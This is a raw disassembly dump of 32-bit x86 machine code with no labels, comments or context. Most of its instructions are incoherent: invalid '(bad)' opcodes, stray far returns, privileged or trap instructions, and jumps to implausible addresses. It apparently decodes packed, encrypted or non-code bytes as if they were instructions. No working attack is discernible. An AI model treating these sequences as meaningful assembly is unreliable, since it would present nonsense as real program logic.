  40e61a:	xor    ebp,DWORD PTR [ebx]
  40e61c:	xor    edi,DWORD PTR [ebx]
  40e61e:	add    esi,DWORD PTR [edi+0x3]
  40e621:	mov    ecx,DWORD PTR [edi]
  40e623:	clc    
  40e624:	retf   0x55cb
  40e627:	into   
  40e628:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e62f:	mov    eax,0x3376554d
  40e634:	mov    esi,DWORD PTR [ebx]
  40e636:	int3   
  40e637:	add    edx,DWORD PTR [ebp+0x3]
  40e63a:	xor    ecx,DWORD PTR [edi]
  40e63c:	xor    ecx,edx
  40e63e:	add    edx,DWORD PTR [ebp+0x3]
  40e641:	mov    ecx,DWORD PTR [edi]
  40e643:	lock retf 0x4dfa
  40e647:	stc    
  40e648:	mov    ecx,DWORD PTR [eax]
  40e64a:	or     BYTE PTR [ebp+0x4d],cl
  40e64d:	jmp    0x104e6dd
  40e652:	dec    ebp
  40e653:	dec    ebp
  40e654:	(bad)  
  40e655:	mov    ebx,esp
  40e657:	clc    
  40e658:	test   ebx,ecx
  40e65a:	clc    
  40e65b:	ror    DWORD PTR [ebp-0x2a],cl
  40e65e:	mov    esi,ecx
  40e660:	call   0x33cc2c14
  40e665:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e66c:	retf   
  40e66d:	ja     0x40e63d
  40e66f:	mov    ebp,DWORD PTR [eax-0x48]
  40e672:	dec    ebp
  40e673:	xor    ecx,DWORD PTR [di+0x3]
  40e677:	mov    esp,esp
  40e679:	clc    
  40e67a:	push   ebp
  40e67b:	retf   
  40e67c:	mov    dl,bl
  40e67e:	adc    esi,edx
  40e680:	jb     0x40e650
  40e682:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e688:	call   0x4d6cb20a
  40e68d:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e694:	popf   
  40e695:	inc    ebp
  40e696:	xor    cl,BYTE PTR [ebp-0x78]
  40e699:	mov    edx,edi
  40e69b:	clc    
  40e69c:	dec    ebp
  40e69d:	retf   
  40e69e:	mov    edx,ebx
  40e6a0:	call   0x560fba7b
  40e6a5:	scas   eax,DWORD PTR es:[edi]
  40e6a6:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e6ac:	popf   
  40e6ad:	sub    esi,DWORD PTR [edx]
  40e6af:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e6b5:	lods   al,BYTE PTR ds:[esi]
  40e6b6:	xor    esp,DWORD PTR [ebx]
  40e6b8:	add    ecx,DWORD PTR [ebp-0x1c]
  40e6bb:	mov    edi,DWORD PTR [ebp-0x8]
  40e6be:	mov    bl,cl
  40e6c0:	cmp    dl,bl
  40e6c2:	jb     0x40e692
  40e6c4:	add    dh,dl
  40e6c6:	dec    ebp
  40e6c7:	scas   eax,DWORD PTR es:[edi]
  40e6c8:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e6ce:	shr    DWORD PTR [ebx],cl
  40e6d0:	into   
  40e6d1:	cmp    edx,esi
  40e6d3:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e6d9:	dec    ebp
  40e6da:	dec    ebp
  40e6db:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e6e1:	retf   
  40e6e2:	xor    edx,esi
  40e6e4:	add    ecx,esi
  40e6e6:	imul   ecx,edx
  40e6e9:	mov    DWORD PTR [ebp+0x8],edx
  40e6ec:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e6ef:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e6f5:	add    esi,DWORD PTR [ebx]
  40e6f7:	mov    ah,0x3
  40e6f9:	inc    ebp
  40e6fa:	sysexit 
  40e6fc:	xlat   BYTE PTR ds:[ebx]
  40e6fd:	pushf  
  40e6fe:	jge    0x40e689
  40e700:	xor    ebx,eax
  40e702:	sub    eax,DWORD PTR [ebp-0x73]
  40e705:	(bad)  
  40e706:	cmp    al,al
  40e708:	jb     0x40e68f
  40e70a:	add    al,bh
  40e70c:	ror    DWORD PTR [ebp-0x7a],1
  40e70f:	xor    edi,edi
  40e711:	add    edi,edi
  40e713:	jmp    0x40e762
  40e715:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e71b:	dec    ebp
  40e71c:	into   
  40e71d:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e723:	popf   
  40e724:	shl    DWORD PTR [edx],cl
  40e726:	retf   0x5588
  40e729:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e72f:	add    eax,DWORD PTR [eax]
  40e731:	in     al,0x4d
  40e733:	push   ebp
  40e734:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e73a:	arpl   WORD PTR [eax],ax
  40e73c:	int    0x4d
  40e73e:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e744:	dec    ebp
  40e745:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e74b:	jge    0x40e71b
  40e74d:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e753:	add    cl,dh
  40e755:	dec    ebp
  40e756:	dec    DWORD PTR [ebx-0x2c032375]
  40e75c:	adc    BYTE PTR [ebp+0x1],0x8b
  40e760:	add    al,bl
  40e762:	jge    0x40e6f0
  40e764:	push   0xffffff9d
  40e766:	push   0x8b3032
  40e76b:	shl    BYTE PTR [ebp+0x55],0x6a
  40e76f:	xor    edi,edi
  40e771:	xor    edx,DWORD PTR [ebx+eax*1]
  40e774:	inc    ebp
  40e775:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e77b:	dec    ebp
  40e77c:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e782:	jbe    0x40e70f
  40e784:	mov    ebp,esp
  40e786:	ror    bl,1
  40e788:	enter  0x14ce,0xaf
  40e78c:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e792:	push   ebp
  40e793:	retf   0x5540
  40e796:	push   ebp
  40e797:	mov    esi,DWORD PTR [edx-0x1c]
  40e79a:	mov    edx,ebx
  40e79c:	cld    
  40e79d:	(bad)  
  40e79e:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e7a5:	sti    
  40e7a6:	add    dh,cl
  40e7a8:	push   0xffffff94
  40e7aa:	call   FWORD PTR [ebp+0x3b5032d0]
  40e7b0:	mov    ecx,DWORD PTR [edi]
  40e7b2:	int3   
  40e7b3:	pop    esi
  40e7b4:	inc    ebp
  40e7b5:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e7bb:	push   ebp
  40e7bc:	xor    esi,DWORD PTR [ebx]
  40e7be:	mov    DWORD PTR [ebx],0xcace0f9c
  40e7c4:	aas    
  40e7c5:	push   ebp
  40e7c6:	inc    ebp
  40e7c7:	xor    eax,esi
  40e7c9:	add    eax,esi
  40e7cb:	mov    eax,DWORD PTR [ebx]
  40e7cd:	(bad)  
  40e7ce:	jmp    0x40e75c
  40e7d0:	mov    bl,BYTE PTR [ebp-0x7674cdfb]
  40e7d6:	rol    ah,1
  40e7d8:	mov    esi,0xf133104d
  40e7dd:	mov    edx,0xff368d80
  40e7e2:	mov    dh,0xd1
  40e7e4:	cmp    edx,DWORD PTR [ebp+0xf]
  40e7e7:	mov    eax,DWORD PTR [edx-0x20]
  40e7ea:	add    BYTE PTR [ebp-0x75],bh
  40e7ed:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e7f4:	popf   
  40e7f5:	retf   0x8632
  40e7f8:	cmp    ebp,0x8
  40e7fb:	call   ebx
  40e7fd:	inc    ebp
  40e7fe:	inc    ebp
  40e7ff:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e805:	mov    esi,DWORD PTR ds:0xc7049cc8
  40e80b:	add    al,al
  40e80d:	add    bl,al
  40e80f:	(bad)  
  40e810:	clc    
  40e811:	enter  0x45,0x35
  40e815:	push   eax
  40e816:	pushf  
  40e817:	mov    edi,eax
  40e819:	int3   
  40e81a:	or     al,al
  40e81c:	test   DWORD PTR [edi],edi
  40e81e:	clc    
  40e81f:	gs inc ebp
  40e821:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e827:	push   ss
  40e828:	xor    ecx,DWORD PTR [ebp+0x3]
  40e82b:	sub    edx,DWORD PTR [ecx-0x76]
  40e82e:	dec    ebp
  40e82f:	add    DWORD PTR [ebx+0x88d845],ecx
  40e835:	mov    esi,DWORD PTR [ebx]
  40e837:	or     BYTE PTR [ebx],al
  40e839:	cmp    edx,DWORD PTR [ecx-0x38]
  40e83c:	dec    ebp
  40e83d:	out    dx,eax
  40e83e:	xor    eax,DWORD PTR [ebp+0x3]
  40e841:	mov    edx,DWORD PTR [ecx-0x28]
  40e844:	dec    ebp
  40e845:	add    BYTE PTR [ebx],dh
  40e847:	push   0x518003
  40e84c:	push   eax
  40e84d:	add    BYTE PTR [ebx-0x300748b],cl
  40e853:	sbb    BYTE PTR [ebp+0x45],cl
  40e856:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e85c:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e862:	dec    ebp
  40e863:	inc    ebp
  40e864:	xor    eax,esi
  40e866:	add    eax,esi
  40e868:	push   ecx
  40e869:	(bad)  
  40e86a:	dec    ebp
  40e86b:	mov    al,ds:0xc9e031ff
  40e870:	retf   
  40e871:	(bad)  
  40e872:	into   
  40e873:	sub    bh,bh
  40e875:	dec    esp
  40e876:	adc    al,0x9c
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	test   DWORD PTR [edi],ecx
  40e87c:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab7ff80]
  40e883:	jmp    0xc9b9f797
  40e888:	add    cl,dl
  40e88a:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e894:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e89a:	rol    BYTE PTR [eax],0x56
  40e89d:	clc    
  40e89e:	arpl   WORD PTR [edx+0x7],si
  40e8a1:	mov    eax,DWORD PTR [ebp-0x30]
  40e8a4:	xor    al,0x40
  40e8a6:	sub    al,0xc7
  40e8a8:	mov    ah,ch
  40e8aa:	add    DWORD PTR [ebp+0x4534f845],eax
  40e8b0:	sub    al,0x84
  40e8b2:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e8b9:	mov    ch,0xff
  40e8bb:	clc    
  40e8bc:	add    DWORD PTR [ebp+0x60],0x31
  40e8c0:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e8c7:	inc    ebp
  40e8c8:	dec    DWORD PTR [ebx-0x341ff701]
  40e8ce:	test   esi,ecx
  40e8d0:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e8d6:	push   eax
  40e8d7:	add    DWORD PTR [ebp+0x0],eax
  40e8da:	dec    ebx
  40e8dc:	or     al,0xce
  40e8de:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e8e5:	into   
  40e8e6:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e8ec:	mov    esi,ecx
  40e8ee:	sar    bh,0x45
  40e8f1:	adc    al,0x8b
  40e8f3:	clc    
  40e8f4:	fadd   DWORD PTR [ebp+0x0]
  40e8f7:	mov    ebp,DWORD PTR [edx+0x8]
  40e8fa:	push   edi
  40e8fb:	adc    BYTE PTR [eax+0x1],0x83
  40e8ff:	add    al,al
  40e901:	retf   
  40e902:	mov    ecx,esi
  40e904:	cld    
  40e905:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e90b:	into   
  40e90c:	add    BYTE PTR [ebx+0x756aec00],cl
  40e912:	jne    0x40e947
  40e914:	inc    DWORD PTR [ebx]
  40e916:	rcl    BYTE PTR [ecx+0x50],1
  40e919:	push   eax
  40e91a:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e920:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e927:	sar    bh,0x84
  40e92a:	or     BYTE PTR [ebx],al
  40e92c:	push   eax
  40e92d:	add    BYTE PTR [ebx+0x4530c845],cl
  40e933:	pushf  
  40e934:	xor    eax,0x89b49cc7
  40e939:	test   eax,ebp
  40e93b:	clc    
  40e93c:	inc    ebp
  40e93d:	inc    ebp
  40e93e:	mov    DWORD PTR [eax+eax*8],esi
  40e941:	sub    al,0x32
  40e943:	mov    BYTE PTR [ebx+ecx*4+0x56d8ec89],bl
  40e94a:	dec    ebp
  40e94b:	arpl   WORD PTR [ebx],si
  40e94d:	inc    edi
  40e94e:	add    ecx,DWORD PTR [ebx+0x56f4b489]
  40e954:	dec    ebp
  40e955:	arpl   WORD PTR [ebx],si
  40e957:	inc    edi
  40e958:	add    eax,DWORD PTR [ebx-0xf7a377]
  40e95e:	inc    ebp
  40e95f:	add    ch,dl
  40e961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e962:	pushf  
  40e963:	inc    edi
  40e965:	dec    esp
  40e967:	lea    eax,[ebp+0x45fff860]
  40e96d:	push   eax
  40e96e:	xor    BYTE PTR [ebp-0x64],dh
  40e971:	(bad)  
  40e972:	(bad)  
  40e973:	pop    esp
  40e974:	lods   al,BYTE PTR ds:[esi]
  40e975:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e97b:	mov    edi,DWORD PTR [esi]
  40e97d:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e984:	test   DWORD PTR [edi-0x8],edx
  40e987:	inc    esi
  40e988:	inc    ebp
  40e989:	add    BYTE PTR [eax+ebp*2],bh
  40e98c:	pushf  
  40e98d:	or     BYTE PTR [ebx+0x5545ec00],0x8b
  40e994:	xor    edi,esp
  40e996:	add    eax,DWORD PTR [eax+0xf013b]
  40e99c:	adc    al,0x0
  40e99e:	add    bh,bh
  40e9a0:	jmp    0xbdeabd
  40e9a5:	add    BYTE PTR [ebp+0x45],cl
  40e9a8:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e9ae:	dec    ebp
  40e9af:	push   0x38033
  40e9b4:	cmp    eax,DWORD PTR [eax]
  40e9b6:	unpcklps xmm7,xmm0
  40e9b9:	jne    0x40e9bb
  40e9bb:	dec    DWORD PTR [ebx+0x5545cc18]
  40e9c1:	mov    DWORD PTR [ebx],esi
  40e9c3:	shl    BYTE PTR [ebx],1
  40e9c5:	inc    ebp
  40e9c6:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e9cc:	retf   0x5575
  40e9cf:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e9d5:	(bad)  
  40e9d6:	stc    
  40e9d7:	in     al,dx
  40e9d8:	or     al,0x85
  40e9da:	dec    ebp
  40e9db:	clc    
  40e9dc:	xor    eax,DWORD PTR [ebp+0x3]
  40e9df:	mov    ebp,ecx
  40e9e1:	rol    BYTE PTR [eax],1
  40e9e3:	inc    ebp
  40e9e4:	add    BYTE PTR [eax-0x7747ab3],bh
  40e9ea:	clc    
  40e9eb:	inc    ebp
  40e9ec:	retf   
  40e9ed:	mov    edx,ebx
  40e9ef:	in     al,dx
  40e9f0:	(bad)  
  40e9f1:	retf   
  40e9f2:	into   
  40e9f3:	into   
  40e9f4:	scas   eax,DWORD PTR es:[edi]
  40e9f5:	dec    ebp
  40e9f6:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e9fc:	sub    ecx,esi
  40e9fe:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ea01:	(bad)  
  40ea02:	mov    edi,eax
  40ea04:	int3   
  40ea05:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ea0b:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ea12:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ea18:	rdtsc  
  40ea1a:	retf   0x559c
  40ea1d:	(bad)  
  40ea1e:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ea25:	inc    ebp
  40ea26:	add    eax,0xeb9c4d3f
  40ea2b:	(bad)  
  40ea2c:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ea32:	xor    ecx,DWORD PTR [ebp+0x33]
  40ea35:	mov    eax,DWORD PTR [ebx]
  40ea37:	call   0xce50b53f
  40ea3c:	retf   0x55d1
  40ea3f:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ea45:	jmp    0x40ea40
  40ea47:	add    BYTE PTR ds:0xebf44d8b,al
  40ea4d:	push   ebp
  40ea4e:	mov    ebp,DWORD PTR [ebx]
  40ea50:	mov    eax,0x33f8558b
  40ea55:	retf   
  40ea56:	xor    ecx,esi
  40ea58:	add    edx,ecx
  40ea5a:	add    eax,DWORD PTR [edx+0xca010f]
  40ea60:	push   ebp
  40ea61:	dec    ebp
  40ea62:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ea68:	stc    
  40ea69:	rol    DWORD PTR ds:0xebce4dd6,cl
  40ea6f:	scas   eax,DWORD PTR es:[edi]
  40ea70:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40ea76:	xor    ebp,DWORD PTR [ebx]
  40ea78:	xor    edi,DWORD PTR [ebx]
  40ea7a:	add    esi,DWORD PTR [edi+0x3]
  40ea7d:	mov    ecx,DWORD PTR [edi]
  40ea7f:	clc    
  40ea80:	retf   0x55cb
  40ea83:	into   
  40ea84:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40ea8b:	test   al,0x4d
  40ea8d:	push   ebp
  40ea8e:	jbe    0x40eac3
  40ea90:	mov    esi,DWORD PTR [ebx]
  40ea92:	mov    al,0x3
  40ea94:	push   ebp
  40ea95:	add    esi,DWORD PTR [ebx]
  40ea97:	rdpmc  
  40ea99:	retf   0x5503
  40ea9c:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40eaa2:	dec    ebp
  40eaa3:	stc    
  40eaa4:	mov    ecx,DWORD PTR [eax]
  40eaa6:	or     BYTE PTR [ebp+0x4d],cl
  40eaa9:	jmp    0x134eb39
  40eaae:	dec    ebp
  40eaaf:	dec    ebp
  40eab0:	(bad)  
  40eab1:	mov    ebx,esp
  40eab3:	clc    
  40eab4:	test   ebx,ecx
  40eab6:	clc    
  40eab7:	ror    DWORD PTR [ebp-0x2a],cl
  40eaba:	mov    esi,ecx
  40eabc:	lock scas eax,DWORD PTR es:[edi]
  40eabe:	inc    ebp
  40eabf:	mov    esi,DWORD PTR [ebx]
  40eac1:	hlt    
  40eac2:	pushf  
  40eac3:	jge    0x40ea50
  40eac5:	sub    ebx,esp
  40eac7:	cmp    ecx,ebx
  40eac9:	ja     0x40ea99
  40eacb:	mov    ebp,DWORD PTR [eax-0x58]
  40eace:	dec    ebp
  40eacf:	xor    ecx,DWORD PTR [di+0x3]
  40ead3:	mov    esp,esp
  40ead5:	clc    
  40ead6:	push   ebp
  40ead7:	retf   
  40ead8:	mov    dl,bl
  40eada:	adc    esi,edx
  40eadc:	jb     0x40eaac
  40eade:	add    BYTE PTR [edi-0xb7474b3],ch
  40eae4:	lock jge 0x40eab2
  40eae7:	sub    ecx,DWORD PTR [ebp+0x3b]
  40eaea:	mov    esi,DWORD PTR [edi-0x20]
  40eaed:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459d]
  40eaf4:	mov    BYTE PTR [ebx-0x34b20729],cl
  40eafa:	mov    edx,ebx
  40eafc:	lock (bad) 
  40eafe:	ror    esi,cl
  40eb00:	push   ebp
  40eb01:	scas   eax,DWORD PTR es:[edi]
  40eb02:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40eb08:	popf   
  40eb09:	sub    esi,DWORD PTR [edx]
  40eb0b:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40eb11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb12:	xor    esp,DWORD PTR [ebx]
  40eb14:	add    ecx,DWORD PTR [ebp-0x1c]
  40eb17:	mov    edi,DWORD PTR [ebp-0x8]
  40eb1a:	mov    bl,cl
  40eb1c:	cmp    dl,bl
  40eb1e:	jb     0x40eaee
  40eb20:	add    dh,dl
  40eb22:	dec    ebp
  40eb23:	scas   eax,DWORD PTR es:[edi]
  40eb24:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40eb2a:	shr    DWORD PTR [ebx],cl
  40eb2c:	into   
  40eb2d:	cmp    edx,esi
  40eb2f:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40eb35:	dec    ebp
  40eb36:	dec    ebp
  40eb37:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40eb3d:	retf   
  40eb3e:	xor    edx,esi
  40eb40:	add    ecx,esi
  40eb42:	imul   ecx,edx
  40eb45:	mov    DWORD PTR [ebp+0x8],edx
  40eb48:	xor    ecx,DWORD PTR [ebp+0x2b]
  40eb4b:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40eb51:	add    esi,DWORD PTR [ebx]
  40eb53:	rol    BYTE PTR [ebx],0x45
  40eb56:	sysexit 
  40eb58:	xlat   BYTE PTR ds:[ebx]
  40eb59:	pushf  
  40eb5a:	jge    0x40eae5
  40eb5c:	xor    esp,eax
  40eb5e:	sub    eax,DWORD PTR [ebp-0x73]
  40eb61:	(bad)  
  40eb62:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40eb69:	dec    ebp
  40eb6a:	xchg   BYTE PTR [ebx],dh
  40eb6c:	inc    DWORD PTR [ebx]
  40eb6e:	(bad)  
  40eb6f:	jmp    0x40ebbe
  40eb71:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40eb77:	dec    ebp
  40eb78:	into   
  40eb79:	mov    ebp,DWORD PTR [edi-0x23737420]
  40eb7f:	popf   
  40eb80:	shl    DWORD PTR [edx],cl
  40eb82:	retf   0x5588
  40eb85:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40eb8b:	add    eax,DWORD PTR [eax]
  40eb8d:	in     al,0x4d
  40eb8f:	push   ebp
  40eb90:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40eb96:	arpl   WORD PTR [eax],ax
  40eb98:	int    0x4d
  40eb9a:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40eba0:	dec    ebp
  40eba1:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40eba7:	jge    0x40eb77
  40eba9:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ebaf:	add    cl,dh
  40ebb1:	dec    ebp
  40ebb2:	dec    DWORD PTR [ebx-0x2c032301]
  40ebb8:	inc    ebp
  40ebb9:	push   ebp
  40ebba:	dec    DWORD PTR [ebx-0x73ff1f34]
  40ebc0:	lea    ebx,[ebp-0x7400cdac]
  40ebc6:	push   eax
  40ebc7:	mov    ah,0x45
  40ebc9:	push   ebp
  40ebca:	mov    esi,DWORD PTR [ebx]
  40ebcc:	les    esi,FWORD PTR [ebx]
  40ebce:	add    BYTE PTR [ebx],al
  40ebd0:	inc    DWORD PTR [ebx]
  40ebd2:	mov    ecx,DWORD PTR [edi]
  40ebd4:	cld    
  40ebd5:	retf   0x4d80
  40ebd8:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ebde:	jne    0x40eb6b
  40ebe0:	(bad)  
  40ebe1:	in     al,dx
  40ebe2:	ror    bl,1
  40ebe4:	clc    
  40ebe5:	into   
  40ebe6:	add    BYTE PTR [edi-0xf2f7475],ch
  40ebec:	not    bl
  40ebee:	adc    al,0xca
  40ebf0:	inc    ebp
  40ebf1:	push   ebp
  40ebf2:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ebf8:	push   0xaf80d6
  40ebfd:	mov    eax,DWORD PTR [eax]
  40ebff:	fdiv   st(7),st
  40ec01:	sti    
  40ec02:	sbb    dh,cl
  40ec04:	pop    esi
  40ec05:	xchg   esp,eax
  40ec06:	leave  
  40ec07:	popf   
  40ec08:	add    al,0x32
  40ec0a:	push   ebp
  40ec0b:	cmp    ebp,esp
  40ec0d:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40ec11:	dec    DWORD PTR [ecx-0x740f0375]
  40ec17:	push   ebp
  40ec18:	cld    
  40ec19:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ec1f:	retf   0x558b
  40ec22:	clc    
  40ec23:	xor    esi,eax
  40ec25:	add    esi,DWORD PTR [ebp-0x75]
  40ec28:	(bad)  
  40ec29:	hlt    
  40ec2a:	or     cl,BYTE PTR [esi+eax*8-0x39cdf763]
  40ec31:	mov    DWORD PTR [edx],ecx
  40ec33:	hlt    
  40ec34:	(bad)  
  40ec35:	dec    ebp
  40ec36:	add    dh,BYTE PTR [ebx]
  40ec38:	leave  
  40ec39:	mov    edx,0xffec8d55
  40ec3e:	push   ecx
  40ec3f:	rol    DWORD PTR [ebp+0x55],1
  40ec42:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ec48:	mov    eax,0xf8030b33
  40ec4d:	lar    ecx,di
  40ec50:	push   ebp
  40ec51:	retf   0x863b
  40ec54:	jne    0x40ec53
  40ec56:	mov    edi,edi
  40ec58:	or     BYTE PTR [ebp+0x41],dh
  40ec5b:	mov    esp,edx
  40ec5d:	cld    
  40ec5e:	inc    eax
  40ec5f:	mov    al,0x29
  40ec61:	add    DWORD PTR [ecx+0x0],eax
  40ec64:	loope  0x40ebeb
  40ec66:	inc    ecx
  40ec67:	call   edx
  40ec69:	inc    edx
  40ec6b:	mov    eax,DWORD PTR [eax]
  40ec6d:	cld    
  40ec6e:	mov    eax,DWORD PTR [eax+0x8d0151]
  40ec74:	clc    
  40ec75:	xor    BYTE PTR [ebp+0x45],al
  40ec78:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40ec7e:	loopne 0x40ec7f
  40ec80:	mov    edi,edi
  40ec82:	mov    ecx,eax
  40ec84:	clc    
  40ec85:	jne    0x40ec57
  40ec87:	call   0x81fd90
  40ec8c:	sub    DWORD PTR [ebp+0x45],esi
  40ec8f:	test   esi,eax
  40ec91:	je     0x40ec94
  40ec93:	mov    eax,esi
  40ec95:	cld    
  40ec96:	or     DWORD PTR [eax+0x401c9],eax
  40ec9c:	push   ebp
  40ec9d:	add    ah,ch
  40ec9f:	add    BYTE PTR [ecx+0x6a],dl
  40eca2:	inc    ebp
  40eca3:	push   esi
  40eca4:	mov    DWORD PTR [eax-0x4],edx
  40eca7:	pop    edi
  40eca8:	mov    ebx,DWORD PTR [ebx-0x4]
  40ecab:	ret    0xbc
  40ecae:	push   es
  40ecaf:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40ecb5:	clc    
  40ecb6:	lock inc ebp
  40ecb8:	jne    0x40ed10
  40ecba:	(bad)  
  40ecbb:	jne    0x40ecc1
  40ecbd:	mov    eax,0xf841ba66
  40ecc2:	rol    BYTE PTR [esi],cl
  40ecc4:	(bad)  
  40ecc5:	jne    0x40ecf8
  40ecc7:	cmp    eax,ebx
  40ecc9:	pop    esi
  40ecca:	mov    ecx,DWORD PTR [eax]
  40eccc:	push   ecx
  40eccd:	inc    ecx
  40ecce:	lea    edi,[esi-0x8]
  40ecd1:	inc    edx
  40ecd2:	inc    ebp
  40ecd3:	ror    DWORD PTR [ebx-0x408103be],0x41
  40ecda:	xchg   esp,ebp
  40ecdc:	mov    ebx,eax
  40ecde:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ece4:	or     edi,eax
  40ece6:	inc    ebp
  40ece7:	inc    ebp
  40ece8:	(bad)  
  40ece9:	mov    ecx,DWORD PTR [eax]
  40eceb:	cld    
  40ecec:	(bad)  
  40eced:	jmp    0x40ecf0
  40ecef:	mov    eax,esi
  40ecf1:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ecf7:	rcl    BYTE PTR [esi+0xf],1
  40ecfa:	iret   
  40ecfb:	inc    ebp
  40ecfc:	leave  
  40ecfd:	(bad)  
  40ecfe:	dec    DWORD PTR [ecx]
  40ed00:	mov    eax,esi
  40ed02:	mov    eax,DWORD PTR [edi]
  40ed04:	mov    dh,0xd1
  40ed07:	push   es
  40ed08:	nop
  40ed09:	(bad)  
  40ed0a:	inc    DWORD PTR [ebx]
  40ed0c:	push   esi
  40ed0d:	leave  
  40ed0e:	iret   
  40ed0f:	add    al,0x46
  40ed11:	push   ebp
  40ed12:	in     eax,0xec
  40ed14:	push   ebp
  40ed15:	push   ecx
  40ed16:	inc    DWORD PTR [ebp+0x56]
  40ed19:	mov    DWORD PTR [esi-0x4],eax
  40ed1c:	loope  0x40ed73
  40ed1e:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ed24:	add    al,BYTE PTR [edx]
  40ed26:	mov    edx,DWORD PTR [ebp-0x17]
  40ed29:	cmp    edi,esi
  40ed2b:	jne    0x40ed2c
  40ed2d:	(bad)  
  40ed2e:	push   esi
  40ed2f:	pop    es
  40ed30:	push   ebp
  40ed31:	mov    ebp,esp
  40ed33:	or     BYTE PTR [ebp+0x41],al
  40ed36:	add    edi,edx
  40ed38:	sub    BYTE PTR [eax-0x4],al
  40ed3b:	ret    0xc275
  40ed3e:	add    DWORD PTR [eax],eax
  40ed40:	sbb    al,0x8b
  40ed42:	mov    edx,DWORD PTR [ecx+0x14]
  40ed45:	lea    edx,[edx-0x1ba7508]
  40ed4b:	push   esi
  40ed4c:	enter  0xd375,0xb8
  40ed50:	test   DWORD PTR [esi],0x6ce0750
  40ed56:	enter  0xd375,0x3b
  40ed5a:	neg    DWORD PTR [esi+0x50]
  40ed5d:	or     cl,dl
  40ed5f:	inc    edx
  40ed60:	(bad)  
  40ed61:	in     eax,dx
  40ed62:	in     al,dx
  40ed63:	(bad)  
  40ed64:	sub    eax,DWORD PTR [ebx]
  40ed66:	inc    eax
  40ed67:	in     eax,dx
  40ed68:	push   eax
  40ed69:	add    dl,BYTE PTR [eax-0x37]
  40ed6c:	push   edi
  40ed6d:	push   ebp
  40ed6e:	imul   ah
